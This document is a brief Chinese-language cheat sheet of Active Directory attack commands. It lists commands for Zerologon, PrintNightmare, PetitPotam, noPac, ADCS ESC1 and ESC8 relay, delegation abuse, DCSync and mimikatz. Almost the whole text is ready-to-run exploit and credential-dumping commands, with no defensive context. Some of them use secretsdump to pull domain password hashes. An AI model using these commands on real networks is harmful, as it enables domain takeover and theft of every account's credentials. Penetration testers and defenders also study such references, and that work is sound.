# AD域渗透攻击

## 1. Zerologon (CVE-2020-1472)

```bash
python3 cve-2020-1472.py -target 192.168.1.1 -save 192.168.1.1.txt
secretsdump.py -hashes :[NTLMHASH] 'DOMAIN/TARGET$@192.168.1.1'
```

## 2. PrintNightmare (CVE-2021-1675)

```bash
python3 printnightmare.py domain/user:password@target_ip
```

## 3. PetitPotam

```bash
python3 PetitPotam.py attacker_ip target_ip
```

## 4. noPac/SAMAccountName

```bash
python3 noPac.py domain/user:password@target_ip
```

## 5. ADCS攻击

### ESC1

```bash
Certify.exe request /ca:ca-name /template:TemplateName /alt:target@domain.com
```

### ESC8

```bash
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs
```

## 6. 约束委派

```bash
getST.py -spn cifs/target.domain.com -dc-ip dc.domain.com domain/user:password
```

## 7. 资源约束委派

```bash
rbcd.py -action write -target 'dc' -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip dc.domain.com
```

## 8. DCSync

```bash
secretsdump.py domain/user:password@dc_ip
```

## 9. DCShadow

需要域管理员权限

## 10. 跨域攻击

### 信任关系利用

```
mimikatz::lsadump::dcsync
```
